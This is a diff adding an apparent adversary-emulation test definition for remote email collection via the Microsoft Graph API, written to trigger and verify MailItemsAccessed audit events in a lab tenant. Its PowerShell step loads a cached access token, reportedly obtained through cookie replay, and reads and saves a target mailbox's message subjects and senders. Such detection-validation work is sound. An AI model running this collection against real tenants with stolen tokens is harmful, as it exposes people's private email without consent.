@@ -1,0 +1,70 @@
+attack_technique: T1114.002
+display_name: "Post-Exploitation – MailItemsAccessed Audit Event Generation"
+atomic_tests:
+  - name: "Access mailbox items via Graph API to generate MailItemsAccessed events"
+    auto_generated_guid: c5d6e7f8-a9b0-1234-cdef-234567890114
+    description: |
+      Reads messages from a victim's mailbox via the Microsoft Graph API,
+      generating MailItemsAccessed events in the Unified Audit Log.
+      MailItemsAccessed is a premium E5 audit event that records every
+      OAuth or MAPI access to mailbox items. Wraps Microsoft.Graph.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      target_user_id:
+        description: "User ID or UPN of the mailbox to access."
+        type: String
+      message_count:
+        description: "Number of messages to read (generates audit events)."
+        type: Integer
+        default: "5"
+      output_path:
+        description: "Path to write sampled message subjects (for evidence)."
+        type: Path
+        default: "tacklebox-mail-items.json"
+      token_cache_path:
+        description: "Path to a Graph-scoped token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        Import-Module Microsoft.Graph.Mail -ErrorAction Stop
+        $token = (Get-Content -LiteralPath '#{token_cache_path}' -Raw | ConvertFrom-Json)
+        Connect-MgGraph -AccessToken ($token.accessToken | ConvertTo-SecureString -AsPlainText -Force) -NoWelcome
+
+        $messages = Get-MgUserMessage `
+            -UserId '#{target_user_id}' `
+            -Top #{message_count} `
+            -Select 'id,subject,receivedDateTime,sender'
+
+        $messages | Select-Object Subject, ReceivedDateTime, @{N='From';E={$_.Sender.EmailAddress.Address}} |
+            ConvertTo-Json | Set-Content -LiteralPath '#{output_path}'
+
+        Write-Host "Accessed $($messages.Count) mail item(s) for '#{target_user_id}'."
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{output_path}') {
+          Remove-Item -LiteralPath '#{output_path}' -Force
+      }
+    references:
+      - "https://learn.microsoft.com/en-us/purview/audit-mailitemsaccessed"
+    auth_profile: "graph-delegated"
+    defense_evasion: "OAuth Graph access to mailbox items; detectable only with E5 MailItemsAccessed audit"
+    requires_token:
+      from: "cookie-replay"
+      resource: "https://graph.microsoft.com"
+    expected_telemetry:
+      - source: ual
+        match:
+          Operations: "MailItemsAccessed"
+          ClientInfoString: "Graph"
+        within_minutes: 30
+    exercises_chokepoint:
+      id: "DC-POSTEX-003"
+      url: "https://detectionchokepoints.com/postex/mail-items-accessed"
